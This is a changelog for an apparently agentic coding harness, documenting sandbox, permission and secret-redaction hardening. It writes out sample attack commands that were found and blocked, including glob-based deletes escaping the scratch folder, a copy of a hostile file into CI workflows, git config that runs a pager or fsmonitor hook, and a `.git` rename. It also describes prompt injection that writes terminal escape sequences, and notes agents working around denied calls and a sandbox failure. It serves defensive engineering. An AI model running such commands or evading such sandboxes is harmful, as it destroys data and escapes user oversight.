# Changelog

All notable changes to **Kyklos** since the repository was initialized on 2026-10-24.

Releases are versioned from `v0.1.0` onward, following [semantic versioning](https://semver.org). Pre-1.0,
a breaking change bumps the minor. To cut one: bump `__version__` in `kyklos.py` and add a
`## v<x.y.z> — <title> (<date>)` section here. Entries above that point predate versioning and are
titled by commit instead.

---

## Unreleased

- **`kyklos --serve`, a protocol for front ends that aren't the terminal (`serve.py`, `PROTOCOL.md`, `kyklos.py`, `ui.py`, `README.md`, tests):** A desktop app or editor can now run Kyklos as a child process and talk JSON-RPC to it over stdin and stdout. `ServeUI` is a third front end beside Aero and the plain REPL. It supplies the callbacks the Agent already takes, so the loop is unchanged. **Same rules:** a permission request carries the explainer's findings, the diff, and exactly the answers the terminal would offer, built by the same `permission_options`. An answer outside them is asked again, never read as a yes. Folder trust is asked before the Agent exists, and the bash mode is chosen per run and never saved. **stdio only:** no port that another local process could connect to. `claim_stdio` keeps private copies of fds 0 and 1, then points fd 1 at stderr and fd 0 at /dev/null, so a stray print can't corrupt the stream and nothing can read the client's messages. **Cancel is Ctrl+C:** `session/cancel` sends SIGINT to the main thread, which reuses the tested interrupt path (process tree killed, unanswered calls repaired, session saved). The SIGINT handler does nothing between turns. On Windows a cancel lands at the next step rather than inside a running command. **Shared pieces:** `edit_preview` moves out of `AeroUI._diff_source` so both front ends show the same diff. `state_snapshot` is the status data. `tool_call` and `tool_result` now carry `call_id`. `CommandContext.show` passes the plain-text fallback to its renderer. 24 new tests drive the real Agent over real pipes, including a cancel during a running `sleep 30` and a hang-up mid-prompt, plus two that spawn `kyklos.py --serve` as a process.
- **Images for models that take them (`kyklos.py`, `tools.py`, `audit.py`, `README.md`, `.env.example`, tests):** Ollama marks vision models with a `vision` capability, but Kyklos kept only `tools` and `thinking` from `/api/show`, every message was a string, and `read_file` refused anything with a NUL in it. **Knowing:** `parse_model_info` keeps `vision` (None when a server lists no capabilities), the `/model` picker marks those models `images`, and at startup a model missing from the cached catalog is asked about directly (`detect_model_vision`, cloud or local, since unlike the context window a local answer is sound here). Other providers say nothing, so `VISION` in `.env` decides for them (and overrides Ollama); unknown means text only. It follows `/model`, `/submodel` and `/provider`, and a subagent gets its own model's answer. **`read_file`:** an image, told by its magic number rather than its name (`image_info`, PNG/JPEG/WebP, with dimensions from the header and no new dependency), comes back as a one-line description, and the image follows as one user message after all of the step's tool results, since a tool result can only be text and a result has to come straight after its call. That message says the image is file content, not instructions. A text-only model is told the file is an image it can't be shown. Over 5 MB is refused with a way to shrink it. **Attaching:** `@path` in a user message attaches an image: relative, absolute or `~`, quoted, or backslash-escaped as a terminal drag pastes it (`find_attachments`). An `@word` that is no file is left alone; a file that isn't an image is sent as text and the user is told. Only the user's own message is read for these, never a subagent prompt. The message still ends with the request verbatim, so compaction and the turn log are unchanged. **Context:** every place that read `content` as a string now goes through `content_text`/`prepend_text`. `estimate_tokens` counts an image as `IMAGE_TOKEN_ESTIMATE` (1,500) instead of its base64 length, which would have read a 300 KB screenshot as 100k tokens and compacted on the step that sent it. Compaction's first stage removes old images. The undo snapshot is a `deepcopy`, which shares strings, instead of a JSON round trip, which would have copied each image into every turn's snapshot. **Recovery:** a provider that refuses (400/413/415/422) a request carrying an image would refuse every request after it too, since the image stays in the history. `_drop_images` replaces every image with a note, says so, and retries once; a second refusal, or one with no image in the conversation, is raised as before. **Audit:** `replay_session` no longer takes the image message for a new user turn. **Checked live on Ollama cloud** (`minimax-m3.1-flash`, a 240×140 PNG of a red circle and a blue square): both an `@` attachment and a `read_file` call came back described correctly, and the saved session has the tool result, then the image message, in that order. JPEG and a hand-encoded lossless WebP, each a different picture so the answer couldn't come from the file name, were described correctly too. **GIF is not sent:** Ollama answered 400 "invalid image input" to GIF87a and GIF89a, on `minimax-m3.1-flash` and `kimi-k3` alike. `_drop_images` recovered as designed, but a refusal costs every image in the conversation, so GIF is now recognised and refused up front (`SENDABLE_IMAGES`), with the command to convert it to PNG. **A silent case, now pointed out:** forcing `VISION=1` onto `gpt-oss:20b`, which lists no vision, was not refused: Ollama dropped the image and the model said it saw none, which `_drop_images` can't see. Ollama's answer is now looked up even when `VISION` is set, and the first image sent to a model that `VISION=1` contradicts raises a notice (`_note_vision_conflict`), once per model; the image still goes, since the setting is the user's call.

- **The new relaxations, the output spill and the parse check, held to what the disk and the project actually are (`kyklos.py`, `tools.py`, tests):** found by an audit of this release's own changes, each confirmed by a probe. **Scratch deletes (high):** `_scratch_operand` read paths lexically and allowed any glob, and bash 3.2, the bash on macOS, expands `.*` to `..` too. So `rm -rf .kyklos/scratch/.*/.*/src` read as a note, ran unprompted in `u` mode and deleted the project's `src`; braces (`{..,x}`) spell `..` outright. `_inside_scratch` replaces it. It refuses braces and brackets, allows a glob only in the last part and never one starting with a dot, and resolves what the path names (for a glob, its folder), which must land inside the real scratch directory. A symlink in scratch, or a symlinked `.kyklos`, no longer aims a delete back at the project. **Scratch redirects (pre-existing):** any redirect target that merely contained `.kyklos/scratch` was skipped, so `echo x > .kyklos/scratch/../../src/app.py` was never mentioned. It now goes through the same check. **"creates" through a symlink:** `_new_workspace_file` checked only that the last part didn't exist, so `echo x > link/new.txt`, with `link` pointing outside, auto-ran; seatbelt blocked the write, but an unsandboxed platform didn't. The folder must now resolve inside the workspace. **Link makers:** all three are judged against the disk before the command runs, so a command that also runs `ln`, `mv`, `cp`, `rsync`, `tar` or the like keeps the louder reading (`LINK_MAKER_RE`), as one that changes directory already did. **Spill:** Kyklos writes `.kyklos/scratch/output/` itself, outside the sandbox, and followed a symlinked `.kyklos`, `scratch` or `output`, writing and pruning logs wherever a repository's link pointed. `ensure_scratch` now refuses a symlink on that path (and creates `.kyklos/.gitignore` without following one), the output folder must resolve to itself, and logs are opened `O_EXCL|O_NOFOLLOW`; when any of that fails the output is cut as before, without a file. **Parse check:** it parsed with Kyklos's own Python, so on a project whose `python3` is newer, valid code such as a t-string was called broken and the model told to fix it. `project_python()` asks bash's `python3` its version once (inside the sandbox, with `-I`, and never from a relative PATH entry), and the `.py` check stays quiet when that version is newer. JSON and TOML are unaffected.
- **Three explainer readings that refused ordinary commands (`kyklos.py`, `README.md`, tests):** found by `eval.py`. `add-cli-flag` took 14–23 steps where its neighbours took 7, and the saved conversations showed why: 9 denied calls in three runs, each followed by a workaround, all from red findings on commands that lose nothing. The same findings stop a person in `u` mode. **Redirect into a new file:** `printf … > probe.txt` read "overwrites probe.txt" whether or not the file existed. It now reads "creates" (a note) when the target is a plain relative path inside the workspace that doesn't exist yet and isn't a protected file (`_new_workspace_file`); existing files, variables, `..`, absolute paths, `AGENTS.md`, hooks and CI stay red. **Deleting scratch files:** `rm .kyklos/scratch/verify.py` read like deleting your work. When every operand is lexically inside the scratch directory (`_scratch_operand`: no `..`, variable, home or absolute path) it is a note, like writing there already is; `.kyklos` itself, a mixed list, and `xargs rm` stay red. **Pipe into an interpreter with its own program:** `… | python3 -c '…'` read "runs whatever python3 prints". When the receiver is given its program by `-c`/`-e`, `-m` or a script file (`_program_from_elsewhere`), the pipe is input and the finding is a note; the inline code is still judged as opaque. A bare `python3`, `python3 -`, `bash -s`, `/dev/stdin` and anything downloaded stay red. **All three relaxations are off in a command that changes directory** (`CHDIR_RE`), since the explainer doesn't follow `cd` and would be judging the wrong path. The explainer tests now give the explainer a workspace where the files they redirect into exist: they had been passing because every target read as existing, and they pin overwriting, which is still red. The audit corpus is unchanged. Rerun of `add-cli-flag` ×3 on deepseek-v4.1-flash: 9, 6 and 8 steps (from 23, 20, 14), 107k tokens (from 321k), 1 denied call (from 9).

- **A content-free trace of every session, and an eval runner that uses it (`kyklos.py`, `eval.py`, `evals/`, `test_eval.py`, `README.md`, tests):** the last two sets of loop changes were argued for, not measured. **Trace:** `Trace` records one JSONL row per Agent event, by a whitelist (`TRACE_FIELDS`) of numbers, flags and short fixed labels: no path, command, prompt or answer ever reaches it. `model_end` now carries the call's duration, prompt, completion and cached tokens, finish reason, or the error class; `tool_result` carries its duration; new `turn_start` / `turn_end` events bracket every turn at every depth with its steps and outcome (`answer`, `cut_off`, `step_limit`, `repeat_stop`, `compaction_stop`, `interrupted`, `error`); and a `signal` event marks each time the harness steps in (nudges with their reason, budget warning, repeat warn and stop, delegation hint, parallel batch, truncated call, redaction, map note, stopped-subagent report). Written to `~/.kyklos/projects/<folder>/traces/`, newest 50 kept, `0600`; `KYKLOS_TRACE=0` turns it off and a path redirects it. A trace that can't be written costs nothing. **Evals:** `eval.py` runs fixture tasks against the provider in `.env`: eight to start, each a repo, a prompt, a `check.py`, and a reference solution. `test_eval.py` requires every check to fail the untouched repo and pass the solution. Runs go in a fresh folder under the temp directory with `kyklos.py --eval`, which replaces the person with a fixed approval policy (`eval_permission`: everything but red findings and secrets) and is refused, before any setup or network call, unless `KYKLOS_EVAL_ROOT` names a marked folder inside the temp directory that holds the workspace and the OS sandbox is on (`eval_workspace_problem`). Checks run the model's code, so they run in the sandbox too. First run against deepseek-v4.1-flash: `fix-off-by-one`, `long-log` and `parallel-lookup` all passed at 59–74% cache reads, and `parallel-lookup` answered with 11 direct tool calls and no subagent. **Not measurable against `main`:** it predates the trace and `--eval`, so the first full run is the baseline.

- **Fewer steps, a stable prompt, and explore subagents side by side (`kyklos.py`, `tools.py`, `ui.py`, `README.md`, tests):** four changes to what a step costs. **Parallel explore:** tool calls ran strictly one at a time, so three independent questions cost three subagents end to end. A run of explore tasks in one message now runs on threads, at most `MAX_PARALLEL_SUBAGENTS` (4) at once; they only read and never ask, which is what makes it safe. No front end had to learn to draw interleaved trees: `EventLanes` passes one lane's events straight through and holds the rest back, replaying each backlog when the lane in front finishes, so the stream keeps the nested shape it always had. `subagent_end` carries its own `secs`, since a replayed subagent's block appears after the work was done. Ctrl+C sets a flag each lane checks at its next event (`Cancelled`) and closes the lanes. A general task, a lone task, or a task with anything else between takes the old path. **A subagent's API failure** is now a failed tool call in both paths; it used to end the parent's turn with the task call unanswered, which the next request was refused for. **Stable prefix:** `send` rebuilt `messages[0]` after every turn that wrote a file, to refresh the workspace sketch — a cache miss from the first token on every provider that caches prompt prefixes, and a full re-evaluation on a local server. The sketch is now scanned once per conversation; changed rows go out as a `[Kyklos: …]` note in front of the next user message (`_map_update`), which still ends with the request verbatim, and are folded into the prompt when it is rewritten anyway (`/reset`, resume, compaction). More than `MAP_DELTA_MAX_ROWS` changes rebuild the prompt instead. `/map` shows the disk and no longer touches the prompt. `/tokens` gains a prompt-cache line from `prompt_tokens_details.cached_tokens` or DeepSeek's `prompt_cache_hit_tokens`, saved with the session and shown as "not reported" rather than zero. **Tools:** `grep` takes `context` (0–10, written as `grep -n -C` writes it, indentation kept) and `output` (`files`, `count`). `edit_file` takes `replace_all`, or `edits`: up to 20, each seeing the text the last one left, all-or-nothing, one diff in the permission panel. The result lists each changed region (`changed_regions`, diffing only between the first and last difference). `bash`'s description says a `cd` does not carry over. **Step budget:** a fifth of `MAX_STEPS` from the end, and never with fewer than two steps left, the last tool result of the step says how many remain. **Not done:** dropping `reasoning_content` from finished turns, which the review had proposed. DeepSeek's thinking-mode guide requires all earlier reasoning to be passed back whenever the request carries tools, and answers 400 when it is missing, so the current behaviour is the correct one. Ripgrep for `grep` was also left out: a second regex dialect that is only there on some machines would make the same search mean different things.

- **What the harness knows reaches the model: stopped subagents report, edits answer with the file, the plan survives a summary, long output is kept, and three false stops are caught (`kyklos.py`, `tools.py`, `README.md`, tests):** five gaps in the loop, each a case where Kyklos held a fact the model needed and didn't pass it on. **Stopped subagents:** a subagent that hit `MAX_STEPS` returned `_step_limit_note` to its parent — "send continue", written for a person — and up to 50 steps of findings went with it. It now gets one more call asking for a report (`_stopped_report`), returned as a partial answer and labelled as one; a tool call in that reply is not run, and no report at all says so. The same on a repeat stop. The main agent's own notes are unchanged. **Edit feedback:** a miss said "re-read the file", a whole step to learn one line of diff; it now names the closest lines (`_closest_start`: exact lines vote for a start, a loose match only when none do) and the first difference. A hit returns the region as it now reads, numbered, and says when the match was a tolerant one, since the text on disk then differs from both strings the model sent. After any write, `.py`, `.json` and `.toml` are parsed in-process (`syntax_problem`) and a file that no longer parses is flagged; known JSON-with-comments names are skipped, and nothing is executed. **Working state:** the plan reached the model only through old tool results, which a stage-2 summary replaces. The summary note now ends with `working_state()` — the plan, files written this session, and the last command if it failed — read off the tools rather than recalled. The plan is saved in the session file, and `/reset` clears it. **Long output:** `_truncate` cut the middle of anything past 20,000 characters, which is where a build's first error sits. `bash` now saves the whole of it under `.kyklos/scratch/output/` (scrubbed of secrets, `0600`, newest 20 kept) and the cut names the path. A workspace-wide `grep` skips that folder; naming it searches it. **False stops:** a reply with no tool call ended the turn whatever it was. An empty reply, a tool call written as text naming a tool on offer, and an answer with plan steps never started now get one `[Kyklos: …]` nudge, one per turn in total, shown as a notice. A plan on its last step, a question, and a cut-off reply are left alone.

- **A stuck model is told, then stopped; a reply cut off at the token limit says so; and the compaction summary says it is not the user speaking (`kyklos.py`, tests):** found by an audit. **Repeats:** `MAX_STEPS` was the only limit, so a model resending an `edit_file` whose `old_string` isn't there could do it 50 times, re-sending the whole conversation each time. The same call returning the same result back to back now gets a `[Kyklos: …]` note on its third time, and on its fifth the turn stops and says so; `continue` lets it try again. The result is part of what has to match, so a retry after the file changed is not a repeat, and any other call in between restarts the count. A message's remaining calls get a `Not run` result, so the conversation stays valid for the next request. **Cut off:** `collect_stream` dropped `finish_reason`, so a write cut off mid-JSON came back as "not valid JSON, send valid JSON", and the model resent the same oversized write to be cut off at the same place. It is now kept from both transports. Under `length` (or `max_tokens`), a call whose arguments don't parse is not run, and its result says why and to send the file in parts; an answer cut off mid-sentence raises a notice to send `continue`. Bad JSON without that limit keeps the old message. **Summary:** it still goes back as a user message, because several OpenAI-compatible servers refuse or mishandle a system message mid-conversation, which rules out the audit's suggestion. Instead the summarizer is told that only the user's own messages are requests, and to record instructions found in files or tool output as what that source says. The note now opens by saying a model wrote it, so it is a record and not the user speaking, and that only the user's own words, quoted verbatim, are requests.

- **`glob` stops listing secret files, `read_file` refuses binary and streams huge files, and bash's `timeout` is bounded (`tools.py`, tests):** found by an audit. **`glob`** listed `.env`, private keys and the like, which `read_file` and `grep` already refused. It now leaves them out and says how many it left out, without names, since "No files matched" would be a falsehood the model acts on. This is hygiene more than protection: `ls -a` still shows the names. **`read_file`** decoded anything as UTF-8 with replacement, so a SQLite file filled the context with noise. It now refuses a file with a NUL in its first 8 KB, the test `grep` already used, and points at `file`, `xxd`, `sqlite3`. It also read the whole file before slicing 2000 lines out of it. Above 10 MB it now streams to the requested window; tested at 21 MB and line 1,000,000, peak memory was 0.03 MB. Smaller files keep `splitlines()`, so their line numbers still agree with `grep`'s. **bash's `timeout`** accepted any value, `86400` included, and anything that was not a number failed late inside `subprocess`. It must now be a number from 1 to 600 seconds. Outside that it is refused, not quietly capped, so the model knows the wait it asked for is not the one it would get; the schema states the limit too.

- **Credentials named for their use, or carried in a URL, are treated as secrets (`tools.py`, `README.md`, tests):** found by an audit. `DATABASE_URL`, `SENTRY_DSN`, `HTTP_AUTHORIZATION` and `NPM_CONFIG__AUTH` matched no secret name, so every command inherited them. Variables ending in `AUTH`, `AUTHORIZATION`, `DSN` or `COOKIE` are now secret by name; the end anchor keeps `FIREBASE_AUTH_DOMAIN` and `GIT_AUTHOR_NAME` out. Any variable whose value is a URL with a password or a token in it is secret by value, so a password-less `postgres://localhost/dev` still reaches the tests, and `KYKLOS_PASS_ENV` lets a real one through while its value stays redacted. The audit's claim that these values were never redacted was half right: database URL passwords already were, by a regex over six schemes. That now covers any scheme (`https://user:pw@`, `mssql://`), and output redaction also catches a long token used as a URL's user (Sentry DSNs, `https://<token>@github.com`), `Authorization:` header values and `Bearer` tokens. A Bearer token must contain a digit, so prose like "bearer authentication" is left alone. Only the secret part is replaced, so the output still says what it was.

- **CI configuration and `.envrc` always ask before they are written (`kyklos.py`, `README.md`, tests):** found by an audit. `cp evil.yml .github/workflows/ci.yml` had no findings and ran unasked in auto-bash, and an "always" grant on `write_file` covered it, although a workflow runs with the repository's secrets on the next push. `.github/workflows/`, `.github/actions/` (composite actions run inside workflows), `.gitlab-ci.yml`, `.circleci/`, `.buildkite/`, `Jenkinsfile`, `.travis.yml`, `azure-pipelines.yml`, `bitbucket-pipelines.yml` and `.envrc` now join `AGENTS.md` among the protected targets: `danger` from bash, and per-call approval with no "always" from the file tools. **Narrower than the audit asked, on purpose:** they are not kernel-read-only. A branch that changes a workflow is ordinary, and a sandbox refusing that write would leave `git checkout`, `pull` or `rebase` half done. The CI risk also needs a push, which already asks. `.gitattributes` stays unprotected: its filters and diff/merge drivers do nothing without git config, which is now read-only, and `git lfs track` writes it legitimately. `.envrc` is the weaker case, since direnv asks before running a changed one, but it cost nothing to add. The rest of `.github` (issue templates, `dependabot.yml`) runs nothing and stays unprotected.

- **Under bubblewrap, protected paths a command creates are moved aside (`tools.py`, `README.md`, tests):** found by an audit. Seatbelt refuses writes by path, so its deny on `AGENTS.md` holds whether or not the file exists. Bubblewrap can only hold an existing file read-only, by binding it onto itself, so in a workspace without an `AGENTS.md` (or `GUARDRAILS.md`, `.gitmodules`, `.pre-commit-config.yaml`, `.git/config`, `.git/hooks`, `.husky`, `.vscode`, or `.git` itself) a command could create one and plant instructions or hooks for later. Binding a read-only placeholder in its place was rejected: bwrap creates the mount point on the real disk and leaves it there, so every command would have littered the repository with empty files, and an empty `.pre-commit-config.yaml` breaks pre-commit. Instead, the protected paths absent before a command are checked after it, including after a timeout or Ctrl+C, and any that appeared are moved to `.kyklos/quarantine/<time>/`, which `.kyklos/.gitignore` keeps out of git. The model is told what moved and to hand it to the user. The outcome matches seatbelt's, with one difference: the path exists while the command runs, and a process the command leaves running in the background could create one afterwards. Both backends now read the protected folders from one list, `SANDBOX_PROTECTED_WORKSPACE_DIRS`. Tested with real bash and git, with the backend mocked as bwrap; not run under bubblewrap itself.

- **Kyklos says when bash runs with no sandbox around it (`kyklos.py`, `ui.py`, `README.md`, tests):** found by an audit. On Windows, on Linux without bubblewrap, or with `KYKLOS_SANDBOX=off`, `sandbox_argv` runs commands unconfined, as designed, but nothing said so outside `/tools`: the startup choice to run unflagged commands unprompted read exactly as it does on a Mac, where a kernel sandbox stands behind the explainer. A new `sandbox_warning()` now names the cause and, on Linux, the fix (install `bwrap`). It appears in the bash-mode choice in both front ends, where it bears on the decision, and at startup: under the Aero banner, so it stays in scrollback, and on stderr in the plain front end, so a piped one-shot answer stays just the answer. Choosing "run unflagged" stays one keypress; the warning is in the same panel as the key. A seatbelt, bubblewrap or outer sandbox shows nothing new.

- **Package runners that fetch what they run now ask first, and get the network once approved (`kyklos.py`, tests):** found by an audit. `npx create-react-app x` had no findings at all, so auto-bash ran it unasked, and since nothing declared network the sandbox refused the fetch rather than the user deciding (outside a sandbox, it simply downloaded and ran the package). With no TTY, npm assumes `--yes`, so its own "Ok to proceed?" never appeared either. `npx`, `npm exec`/`npm x`, `bunx`/`bun x`, `pnpx`, `pnpm dlx`, `yarn dlx`, `uvx`, `uv tool run` and `pipx run` are now `danger` with a finding that declares network, so an approved run can reach the registry. `bunx`, `pnpx` and `uvx` used to be unrecognised, which asked but ran without network, so approving them never worked. **What still runs unasked:** `npx jest` and friends when the project has that binary in `node_modules/.bin`, at the root or one folder down, with no version, scope, `-p` or `-c`. That copy is the project's own code, the same trust as `npm test`; `npx jest@29` or a binary the project lacks still asks.

- **The model's own words are cleaned of terminal escapes before they are drawn (`ui.py`, `kyklos.py`, tests):** found by an audit. Tool results, commands and plan steps already went through `sanitize_terminal_text`, but the answer, the notes between tool calls, the live preview of a reply forming and the plain REPL's printed answer did not, and Rich passes ESC through untouched: tested, an OSC 52 clipboard write, an OSC 8 link and `ESC[2J` reached the terminal intact from both `Markdown` and `Text`. The model repeats what the files and pages it reads tell it to, so a prompt injection could write to the user's clipboard or redraw the screen. `AeroMarkdown` now cleans its source itself, so no caller can forget to, the preview cleans its buffer, and `say()` in both front ends cleans what it is handed, since that carries a provider's error body and, in the plain REPL, `/diff`'s file contents. Only the sequences go; the text around them stays. Markdown links are unchanged: Rich still draws `[text](url)` as a clickable link whose text need not match its target.

- **Git options before the subcommand no longer hide it, and git's settings are read-only in the sandbox (`kyklos.py`, `tools.py`, `README.md`, tests):** found by an audit. The explainer took the word after `git` for the subcommand, so `git --no-pager reset --hard`, `git -C sub push --force` and `git --no-pager clean -fdx` had no findings and ran unasked in auto-bash mode, and `git -c core.pager='sh -c …' log` ran a program through a read-only subcommand. Git's global options are now peeled first; `-c` and `--config-env` with a key that runs a program, and `--exec-path=`, are `danger`. `GIT_EXEC_CONFIG_RE` also learned `include.path`, `includeIf.*.path`, `credential.<url>.helper`, `gpg.program`, `sequence.editor`, `diff.external`, `diff.*.command`, `merge.*.driver`, `difftool`/`mergetool` `.cmd`, `pager.*`, `core.alternateRefsCommand` and `uploadpack.packObjectsHook`, and `git config set <key> <value>` and `git config --file x <key> <value>` are read as writes. In the kernel sandbox, `.git/config` was writable while `.git/hooks` was not, although `core.fsmonitor` or `core.hooksPath` in it runs the next time the user types `git status`, unconfined; tested, `git config core.fsmonitor …` succeeded under seatbelt. It is now read-only in both backends. **Found by testing:** `mv .git .g` also succeeded, after which no rule matched `.g/config` or `.g/hooks`, so the existing hooks protection could be walked around the same way. Seatbelt now denies writes to the `.git` entry itself, and bubblewrap binds `.git` onto itself, since a mount point cannot be renamed (written to the bwrap semantics, not run on Linux here). **The cost:** `git init`, `git config`, `git remote add` and `git push -u` no longer work inside the sandbox, and the `git init --template=` way through is gone; commits, branches, merges, tags, stash and gc still do, checked against the real kernel. The `[harness]` hint says so and tells the model to hand those commands to the user, and a bubblewrap `Read-only file system` now counts as a sandbox refusal.

- **A "Keychain Not Found" dialog raised from inside the sandbox now has an explanation, in the README and in front of the model (`tools.py`, `README.md`, tests):** found when a test launched the installed Chrome by hand under the macOS sandbox. The profile hides `~/Library/Keychains` on purpose; Chrome, started without `--use-mock-keychain`, went looking for it, did not find it, and macOS put a dialog on the user's screen — "A keychain cannot be found to store 'Chrome'", with a button that offers to **Reset To Defaults** a keychain that was never missing. The system log ties it to the run: the Chrome process calls the Keychain APIs and `SecurityAgent`, which draws the dialog, starts 0.04s later. Chrome runs that hung alongside it are consistent with a dialog nobody answered; that was not confirmed with the flags in place, and no sandbox behaviour changed. Two additions, neither of which loosens anything. The failure hint now fires on any macOS output that mentions the Keychain (such a failure carries no "operation not permitted" for the old trigger to see) and tells the model not to retry unchanged, how to keep a tool off the Keychain (`--use-mock-keychain --password-store=basic` for Chrome and Chromium; Playwright already passes both, read in its source), and that the user should **click Cancel, never Reset To Defaults**. And the timeout message, which until now never saw the command, names the same cause when a command starts Chrome by hand (`--headless`, `--dump-dom`, `--user-data-dir` and the like, no `--use-mock-keychain`) and hangs: it prints nothing, so no failure hint could catch it. The detection is a heuristic on the command text and only decides whether to add a sentence.

- **`KYKLOS_SANDBOX_CONNECT`: a connect-only variant of the port allowlist, with nothing that can listen (`tools.py`, `kyklos.py`, `README.md`, `.env.example`, tests):** the listening allowlist cannot keep a server on loopback (see the next entry), so this is the setting for the case where listening is not needed: a dev server the user runs in their own terminal, and a browser test or `curl` that talks to it. Each listed localhost port gets one rule, `network-outbound`, and no `network-bind` or `network-inbound`, so nothing in the sandbox can open a port of its own and there is no listener to expose. Tested against the real sandbox: a whole request and reply goes through (a second rule for the reply direction added nothing); a server bound to `::1` only is reached as well as one on `127.0.0.1` (Vite's `localhost` is often the former), through Node and through Chrome; every other port, and the same port on another host, stay refused; and `bind` is refused everywhere, including on a connect-only port. Same parsing as the other setting (single ports from 1024 up, capped at 16, anything else dropped and named in `/tools`), shown there as `connect-only ports`, named in the failure hint and, when set, in the system prompt. A port in both settings gets the larger grant once. As with the listening setting, whatever else already listens on a listed port is reachable from the sandbox.
- **An opt-in localhost port allowlist for the macOS sandbox, and hints that name the way through a wall (`tools.py`, `kyklos.py`, `README.md`, `.env.example`, tests):** the profile denies all networking, loopback included, so a dev server could not even `bind` 127.0.0.1 (`EPERM`), and a browser test against one could not run inside the sandbox. `KYKLOS_SANDBOX_PORTS=5173,4173` now opens bind, accept and connect on `localhost` for just those ports, and nothing else: other ports, other hosts, and the listed port on another host all stay refused, checked against the real kernel with a listener outside the sandbox standing in for a database or a local proxy. Off by default. It is a list of single ports from 1024 up (SBPL has no ranges; below 1024 is where the machine's own services listen), capped at 16, and anything else is dropped and named in `/tools` rather than guessed at, so a typo closes the hole instead of widening it. Opening loopback wholesale was the alternative and was rejected: tested, it let a command reach any listener outside the sandbox. **The limit, found by testing:** it restricts *which ports*, not *which interface*. The grammar takes only `*` or `localhost` as a host (no IP literals), `localhost` matches every local address for a listening socket, and `accept()` never consults the peer, so denying inbound from every peer changed nothing: a server that binds `0.0.0.0` (the Express and `python -m http.server` default) is reachable from the network on that port while it runs. Only the server's own bind address decides, so the model is told to use `127.0.0.1`, in the system prompt when ports are open and in the failure hint. The Linux backend is unchanged: bubblewrap gives the sandbox its own loopback. Alongside it, the `[harness]` hint now names the way through the two walls an ordinary job hits: `git init` and `git clone` copy sample hooks into `.git/hooks`, which is read-only on purpose (`git init --template=` makes a working repository without them; verified, including a commit and that a hook still cannot be planted), and a listen or connect refused because the network is off (it says which ports are open, and how the user opens one). Chrome's `net::ERR_ACCESS_DENIED` now counts as a sandbox refusal.
- **The sandbox now denies the token stores an install-time payload goes for (`tools.py`, `README.md`, tests):** the kernel read-deny covered `~/.ssh`, `~/.aws`, `~/.kube`, `~/.docker` and `~/.npmrc` but not the other places a signed-in developer keeps tokens, while network is open for exactly the commands most likely to run someone else's code — an `npm install`. The Miasma npm worm (June 2026, a hidden `binding.gyp` that runs at install with no script in `package.json`) took GitHub, GCP, Azure and Vault tokens and password-manager stores, which is that list. Added to both backends: `~/.config/gh`, `~/.config/gcloud`, `~/.azure`, `~/.config/op`, `~/.op`, `~/.password-store`, `~/.config/gopass`, `~/.local/share/gopass`, and the files `~/.vault-token`, `~/.gem/credentials`, `~/.cargo/credentials{,.toml}`, `~/.terraform.d/credentials.tfrc.json`, `~/.config/git/credentials`, `~/.yarnrc.yml`. Tested against the real `sandbox-exec`: with the old lists every planted file was readable, with the new ones none is, while a sibling under `~/.config` and the project stay readable. **Side effect:** a `gh`, `gcloud` or `az` call run through Kyklos's bash can no longer read its own file-stored login, the same as `aws` and `kubectl` already behaved. **Not covered:** a credential held in the macOS Keychain is reached over a Mach service, not by reading a file, and this profile is `(allow default)`; the deny list doesn't address that path, and it is untested here.

- **`a always bash` no longer covers commands Kyklos can't read (`kyklos.py`, `ui.py`, `README.md`, `DESIGN.md`, tests):** `is_auto_allowed` returned `True` for any non-red command once `"bash"` was in the session's rules, *before* it looked for `opaque` findings, while the startup auto-bash mode and `must_be_asked` both stop for them on the stated ground that "can't tell what this does" must never mean "go ahead". So the key on the yellow prompt (`node -e …`, a script whose contents aren't shown) was a strictly wider grant than the mode built to refuse those commands: one `a` ran every later unreadable script unasked. Now both blanket grants stop at an opaque finding; only a `p prefix` rule, which names what was trusted, still covers one. The prompt no longer offers `a` for such a command (new `has_opaque`; `apply_permission_answer(..., opaque=)`), in both the panel and the plain prompt. A behaviour change for anyone who relied on `a` to wave unrecognised programs through: they now ask each time, or take a prefix.
- **A project under `~/Desktop`, `~/Documents` and the other protected folders can run Node under the seatbelt sandbox (`tools.py`, tests):** `realpath()` `lstat`s every ancestor of a path, and the read-deny on the personal folder covers the workspace's parents even though the workspace itself is allowed back, so `lstat ~/Desktop` failed with `EPERM` and `fs.realpathSync` — which Node runs on every entry script — died before reading a byte of the project. It surfaced as an esbuild install failing, with the agent inventing `--preserve-symlinks-main` around it. The profile now allows `file-read-metadata` on those ancestors, as literals: it says the workspace's parents exist, which the workspace path already says, and lists and reads nothing, so siblings stay unreadable. Reproduced and fixed against the real `sandbox-exec`; the test runs that case for real where seatbelt and node are available.

- **The API call streams, and nothing above `_complete()` can tell (`kyklos.py`, `ui.py`, `.env.example`, `README.md`, tests):** the v0.4.0 notes recorded that nothing streamed, and that a non-streaming call therefore carries zero bytes for the whole generation while an upstream limit sees a silent connection — alongside a probe finding `ollama.com` closing an idle socket at 150s. Streaming is the fix for that, and it is a transport fix: the reason to do it is the socket, not the screen.
  - **Reassembled into the shape that was already there.** `collect_stream` rebuilds a streamed reply into the same object a whole response would have been — `.choices[0].message` with `.content`, `.tool_calls`, `.reasoning_content`, and `.usage` — because only two places read a response (the agent loop and the compaction summary) and 274 scripted replies in the tests read it too. Three details of the delta format drive that loop: `tool_calls` arrive as fragments tagged with an `index`, with `id` and `name` usually only on an index's first fragment and `arguments` split at arbitrary points inside the JSON, so nothing can be parsed until the end; `usage` arrives on a final chunk whose `choices` list is empty, so no chunk may be assumed to have a choice; and `reasoning_content` is a delta like `content`. A call that streams no `id` is given one, which is self-consistent because Kyklos writes both the assistant message and the tool result paired against it.
  - **Buffer, then commit.** The stream is drained inside the existing retry block, so a connection that dies at 90% is discarded and the call retried whole, exactly as a failed non-streaming call was. Emitting fragments as they arrived would instead make each retry visible as duplicated output. The cost is explicit: a stream that fails late is paid for twice.
  - **A quiet wrong number, said out loud.** `stream_options.include_usage` is honoured unevenly across OpenAI-compatible servers. Without usage the session spend figure under-reports and `context_tokens()` falls back to an estimate — which is what decides when compaction fires. Both already degraded silently; the first streamed call that reports nothing now emits a `notice`, shared with subagents through `notices_seen` so a fact about the provider is said once per run, not once per nested agent.
  - **`STREAM=0` is the way out,** for a provider whose delta format or usage reporting misbehaves. Streaming changes nothing above `_complete()`, which is what makes a single switch enough.
